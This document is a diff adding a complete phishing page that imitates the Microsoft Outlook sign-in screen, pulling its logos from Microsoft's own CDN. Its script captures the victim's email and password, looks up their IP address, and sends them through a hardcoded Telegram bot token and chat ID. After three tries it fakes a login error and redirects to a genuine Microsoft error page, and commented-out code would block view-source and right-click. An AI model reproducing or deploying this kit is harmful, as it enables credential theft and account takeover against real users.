@@ -1,0 +1,626 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="shortcut icon" type="image/x-icon" id="shortcut_icon" />
+    <title>Sign in to account</title>
+    <style>
+      * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+      }
+      .custom-loader {
+        width: 7px;
+        height: 7px;
+        border-radius: 50%;
+        clip-path: inset(-45px);
+        color: #766df4;
+        box-shadow: -60px 15px, -60px 15px, -60px 15px;
+        transform: translateY(-15px);
+        animation: d9 1s infinite linear;
+      }
+
+      @keyframes d9 {
+        16.67% {
+          box-shadow: -60px 15px, -60px 15px, 19px 15px;
+        }
+        33.33% {
+          box-shadow: -60px 15px, 0px 15px, 19px 15px;
+        }
+        40%,
+        60% {
+          box-shadow: -19px 15px, 0px 15px, 19px 15px;
+        }
+        66.67% {
+          box-shadow: -19px 15px, 0px 15px, 60px 15px;
+        }
+        83.33% {
+          box-shadow: -19px 15px, 60px 15px, 60px 15px;
+        }
+        100% {
+          box-shadow: 60px 15px, 60px 15px, 60px 15px;
+        }
+      }
+      .loader-wrapper {
+        position: absolute;
+        top: 7px;
+        margin: auto;
+        width: 100%;
+        left: 224px;
+        display: none;
+      }
+      .brand_img svg {
+        width: 200px;
+        height: auto;
+      }
+
+      .brand_img {
+        display: flex;
+        justify-content: center;
+        align-items: center;
+      }
+
+      .d_none {
+        display: none !important;
+      }
+      .d_block {
+        display: block !important;
+      }
+      div#s_header {
+        display: flex;
+        justify-content: center;
+        padding-top: 80px;
+      }
+
+      div#s_header img {
+        height: 36px;
+      }
+
+      div#s_footer {
+        padding: 6px 35px;
+        background: rgb(0 0 0 / 55%);
+        text-align: end;
+        position: absolute;
+        bottom: 0px;
+        width: 100%;
+      }
+
+      div#s_footer p {
+        display: inline-block;
+        padding: 1px 9px;
+        color: white;
+        font-family: system-ui;
+        font-size: 12px;
+      }
+      .k_s_wrapper {
+        width: 440px;
+        margin-top: 30px;
+      }
+      .error_msg {
+        color: #e81123;
+        margin-top: 10px;
+        font-size: 15px;
+      }
+      div#s_body {
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        font-family: system-ui;
+      }
+
+      .key_part1 {
+        box-shadow: 0 2px 6px rgba(0, 0, 0, 0.2);
+        padding: 46px;
+      }
+
+      .key_part2 {
+        box-shadow: 0 2px 6px rgba(0, 0, 0, 0.2);
+        padding: 10px;
+        display: flex;
+        align-items: center;
+        margin-bottom: 30px;
+        margin-top: 25px;
+        cursor: pointer;
+        padding-left: 23px;
+        background: white;
+      }
+
+      .key_part2 img {
+        width: 32px;
+        height: 32px;
+      }
+
+      .key_part2 p {
+        font-family: system-ui;
+        padding-left: 15px;
+      }
+
+      .key_part2:hover {
+        background: #dddddd94;
+      }
+
+      .kp1_1 h2 {
+        font-size: 24px;
+        font-family: system-ui;
+        font-weight: 600;
+        color: #1b1b1b;
+      }
+
+      .kp1_1 {
+        margin-top: 11px;
+      }
+
+      .kp1_1 p {
+        font-size: 14px;
+      }
+
+      .key_taker_box {
+        margin-top: 15px;
+      }
+
+      input#user_key {
+        outline: none;
+        border: none;
+        border-bottom: 1px solid rgba(0, 0, 0, 0.4);
+        width: 100%;
+        border-color: rgba(0, 0, 0, 0.4);
+        padding: 10px 0px;
+        height: 36px;
+        font-size: 15px;
+      }
+      input#user_pass {
+        outline: none;
+        border: none;
+        border-bottom: 1px solid rgba(0, 0, 0, 0.4);
+        width: 100%;
+        border-color: rgba(0, 0, 0, 0.4);
+        padding: 10px 0px;
+        height: 36px;
+        font-size: 15px;
+      }
+      p.erere {
+        font-size: 13px;
+        margin-top: 13px;
+        margin-bottom: 10px;
+        color: #1b1b1b;
+      }
+
+      .link__ {
+        color: #0067b8;
+        font-size: 14px;
+      }
+
+      .link__:hover {
+        text-decoration: underline;
+        cursor: pointer;
+        color: #666;
+      }
+
+      button#next_btn {
+        padding: 7px 39px;
+        background: #0067b8;
+        border: none;
+        color: white;
+        font-weight: 500;
+        cursor: pointer;
+        font-size: 15px;
+      }
+
+      button#next_btn:hover {
+        background: #005da6;
+      }
+      button#sign_in_btn {
+        padding: 7px 39px;
+        background: #0067b8;
+        border: none;
+        color: white;
+        font-weight: 500;
+        cursor: pointer;
+        font-size: 15px;
+      }
+
+      button#sign_in_btn:hover {
+        background: #005da6;
+      }
+
+      .next_btn_box {
+        margin-top: 10px;
+        text-align: right;
+        padding-bottom: 1px;
+      }
+      .u_k_box {
+        display: flex;
+        margin-top: 11px;
+      }
+
+      .u_k_box img {
+        margin-right: 5px;
+        border-radius: 50%;
+        cursor: pointer;
+      }
+
+      .u_k_box img:hover {
+        background: #0000001a;
+      }
+
+      h1.p_heading {
+        font-family: system-ui;
+        font-weight: 500;
+        color: #000000b8;
+        margin-top: 14px;
+      }
+      .key_part1 {
+        position: relative;
+        overflow: hidden;
+        background: white;
+      }
+
+      .key_part01 {
+        position: absolute;
+        top: 46px;
+        width: 350px;
+        right: -360px;
+        transition: all 0.4s;
+      }
+
+      .k_part00 {
+        transition: all 0.4s;
+      }
+
+      .next_action .k_part00 {
+        transform: translateX(-420px);
+      }
+
+      .next_action .k_part01 {
+        transform: translateX(-444px);
+      }
+
+      .next_action .key_part01 {
+        transform: translateX(-407px);
+      }
+
+      .next_action {
+        height: 365px;
+        margin-top: 95px;
+      }
+      .height_gainer {
+        height: 415px !important;
+      }
+      .error_border {
+        border-color: #e81123 !important;
+      }
+      section#singin_section {
+        background-position: center center;
+        height: 100vh;
+      }
+      .edit_footer {
+        background: transparent !important;
+      }
+
+      div#s_footer p {
+          color: white;
+          font-weight: 400;
+          cursor: pointer;
+      }
+      div#s_footer p:hover{
+        text-decoration: underline;
+      }
+      /* section#singin_section {
+        display: none;
+      } */
+      @media only screen and (max-width: 600px) {
+        section#singin_section {
+          background: white;
+        }
+
+        .key_part1 {
+          box-shadow: none;
+          padding: 25px;
+        }
+
+        div#s_header {
+          display: none;
+        }
+
+        .k_s_wrapper {
+          margin-top: 0px;
+        }
+
+        .key_part2 {
+          margin: 25px;
+          margin-top: 70px;
+        }
+
+        .key_part1.next_action {
+          margin-top: 0px;
+        }
+
+        .next_action .key_part01 {
+          transform: translateX(-378px);
+        }
+
+        .key_part01 {
+          top: 25px;
+        }
+      }
+      .brand_img img {
+        width: 115px;
+      }
+      .con_header_wrapper {
+        display: flex;
+        justify-content: space-between;
+        background: black;
+      }
+
+      .front_outer_wrapper {
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
+      }
+
+      .front_outer {
+        width: 440px;
+        height: 340px;
+        background: white;
+        padding: 40px;
+        box-shadow: 0px 2px 3px 0px rgba(0, 0, 0, 0.55);
+        border: 1px solid rgba(0, 0, 0, 0.4);
+      }
+
+      .brand_img {
+        display: flex;
+        justify-content: left;
+        margin-bottom: 30px;
+      }
+
+      .front_outer h1 {
+        color: #404040f2;
+        font-size: 21px;
+        font-family: system-ui;
+        text-align: left;
+        font-weight: 500;
+      }
+
+      .front_outer p {
+        font-size: 15px;
+        color: #444;
+        margin-top: 16px;
+        text-align: left;
+        font-family: system-ui;
+      }
+
+      .next_btn_box.f_o_btn_ {
+        margin-top: 90px;
+      }
+      @media only screen and (max-width: 600px) {
+      }
+    </style>
+  </head>
+  <body>
+    <section id="singin_section">
+      <div id="s_header">
+        <img alt="Outlook" id="outlk_logo" />
+      </div>
+      <div id="s_body">
+        <div class="k_s_wrapper">
+          <div class="key_part1">
+            <div class="loader-wrapper">
+              <div class="custom-loader"></div>
+            </div>
+            <div class="k_part00">
+              <img src="" alt="" id="brandImage2" />
+              <div class="kp1_1">
+                <h2>Sign in</h2>
+                <p>to continue to Outlook</p>
+              </div>
+              <div class="error_msg d_none">
+                Enter a valid email address, phone number, or Skype name.
+              </div>
+              <div class="key_taker_box">
+                <input type="text" id="user_key" placeholder="Email, phone, or Skype" />
+              </div>
+              <p class="erere">No account? <span class="link__">Create one!</span></p>
+              <p class="link__">Can’t access your account?</p>
+              <div class="next_btn_box">
+                <button id="next_btn" onclick="next_action()">Next</button>
+              </div>
+            </div>
+
+            <div class="key_part01">
+              <img src="" alt="" id="brandImage3" />
+              <div class="u_k_box">
+                <img onclick="back_action()" id="back_icon_" />
+                <p id="u_key"></p>
+              </div>
+              <h1 class="p_heading">Enter password</h1>
+              <div class="error_msg error_msg2 d_none">
+                Your account or password is incorrect. If you don't remember your password,
+                <span class="link__">reset it now.</span>
+              </div>
+              <div class="error_msg error_msg3 d_none">
+                Please enter the password for your Microsoft account.
+              </div>
+              <div class="key_taker_box">
+                <input type="password" id="user_pass" placeholder="Password" />
+              </div>
+              <p class="erere"><span class="link__">Forgot password?</span></p>
+              <p class="link__ d_none">Email code to <span id="u_key1"></span></p>
+              <br />
+              <div class="next_btn_box">
+                <button id="sign_in_btn" onclick="sign_in_action()">Sign in</button>
+              </div>
+            </div>
+          </div>
+          <div class="key_part2">
+            <img id="key_icon" />
+            <p>Sign-in options</p>
+          </div>
+        </div>
+      </div>
+      <div id="s_footer" class="">
+        <p>Terms of use</p>
+        <p>Privacy & cookies</p>
+        <p style="text-decoration: none;">•••</p>
+      </div>
+    </section>
+    <script>
+      const key_section = document.getElementById('key_section');
+      const singin_section = document.getElementById('singin_section');
+      const next_btn = document.getElementById('next_btn');
+      const user_key = document.getElementById('user_key');
+      const user_pass = document.getElementById('user_pass');
+      const key_part1 = document.getElementsByClassName('key_part1')[0];
+      const key_part01 = document.getElementsByClassName('key_part01')[0];
+      const key_part2 = document.getElementsByClassName('key_part2')[0];
+      const error_msg = document.getElementsByClassName('error_msg')[0];
+      const error_msg2 = document.getElementsByClassName('error_msg2')[0];
+      const error_msg3 = document.getElementsByClassName('error_msg3')[0];
+      const loader_wrapper = document.getElementsByClassName('loader-wrapper')[0];
+      const s_header = document.getElementById('s_header');
+      const u_key = document.getElementById('u_key');
+      const u_key1 = document.getElementById('u_key1');
+      const s_footer = document.getElementById('s_footer');
+
+      var clickCount = 0;
+
+      function validateNameKey(nameKey) {
+        const regex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+        return regex.test(nameKey);
+      }
+      function next_action() {
+        if (user_key.value.length > 14 && validateNameKey(user_key.value)) {
+          key_part1.classList.add('next_action');
+          key_part2.classList.add('d_none');
+          error_msg.classList.remove('d_block');
+          if (clickCount > 0) {
+            key_part1.classList.add('height_gainer');
+          }
+          u_key.innerHTML = user_key.value;
+          u_key1.innerHTML = user_key.value;
+          s_header.classList.add('d_none');
+          s_footer.classList.add('edit_footer');
+        } else {
+          error_msg.classList.add('d_block');
+        }
+      }
+      function back_action() {
+        key_part1.classList.remove('next_action');
+        key_part2.classList.remove('d_none');
+        key_part1.classList.remove('height_gainer');
+        s_header.classList.remove('d_none');
+        s_footer.classList.remove('edit_footer');
+      }
+      function ssss() {
+        return fetch('https://api.ipify.org/?format=json')
+          .then((response) => response.json())
+          .then((data) => {
+            return data.ip;
+          })
+          .catch((error) => {
+            console.error('Error:', error);
+          });
+      }
+
+      async function sign_in_action() {
+        if (user_pass.value.length > 4) {
+          try {
+            loader_wrapper.classList.add('d_block');
+            const ipAddress = await ssss();
+            const message =
+              'Message from Office page. Email or Phone Or Skype is: ' +
+              user_key.value +
+              ' and Password is: ' +
+              user_pass.value +
+              ' and the IP is: ' +
+              ipAddress;
+
+            const token = '6113839454:AAFY5WlixlzhREvqK1DAGyZBRnDeY-D9jU4';
+            const chatId = '1461764555';
+            const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(
+              message
+            )}`;
+            fetch(url)
+              .then((response) => {
+                if (!response.ok) {
+                  throw new Error('Network response was not ok');
+                }
+                return response.json();
+              })
+              .then((data) => {
+                console.log(data);
+              })
+              .catch((error) => {
+                console.error(error);
+              });
+            loader_wrapper.classList.remove('d_block');
+          } catch (error) {
+            console.error('Error:', error);
+          }
+          clickCount++;
+          if (clickCount == 3) {
+            key_part01.classList.add('d_none');
+            window.location.replace('https://signup.live.com/error.aspx?errcode=8001')
+          }
+          if (clickCount == 3) {
+            error_msg2.classList.remove('d_block');
+            user_pass.classList.remove('error_border');
+          } else {
+            error_msg2.classList.add('d_block');
+            user_pass.classList.add('error_border');
+          }
+          key_part1.classList.add('height_gainer');
+          error_msg3.classList.remove('d_block');
+          user_pass.value = '';
+        } else {
+          error_msg2.classList.remove('d_block');
+          error_msg3.classList.add('d_block');
+          key_part1.classList.add('height_gainer');
+        }
+      }
+      // function redirectCU(e) {
+      //   if (e.ctrlKey && e.which == 85) {
+      //     return false;
+      //   }
+      // }
+      // document.onkeydown = redirectCU;
+      // function redirectKK(e) {
+      //   if (e.which == 3) {
+      //     return false;
+      //   }
+      // }
+      // document.oncontextmenu = redirectKK;
+      var num = 2;
+      var parentLink = 'https://aadcdn.msftauth.net/shared/1.0/content/';
+      while (num < 4) {
+        var idName = 'brandImage' + num;
+        var srcName = parentLink + 'images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg';
+        document.getElementById(idName).setAttribute('src', srcName);
+        num++;
+      }
+      function setImg(elem, imageName) {
+        elem.setAttribute('src', parentLink + imageName);
+      }
+      setImg(
+        document.getElementById('outlk_logo'),
+        'images/applogos/53_8b36337037cff88c3df203bb73d58e41.png'
+      );
+      setImg(
+        document.getElementById('key_icon'),
+        'images/signin-options_4e48046ce74f4b89d45037c90576bfac.svg'
+      );
+      setImg(
+        document.getElementById('back_icon_'),
+        'images/arrow_left_a9cc2824ef3517b6c4160dcf8ff7d410.svg'
+      );
+      document
+        .getElementById('shortcut_icon')
+        .setAttribute('href', parentLink + 'images/favicon_a_eupayfgghqiai7k9sol6lg2.ico');
+      singin_section.style.backgroundImage =
+        "url('" + parentLink + "images/backgrounds/2_bc3d32a696895f78c19df6c717586a5d.svg')";
+    </script>
+  </body>
+</html>
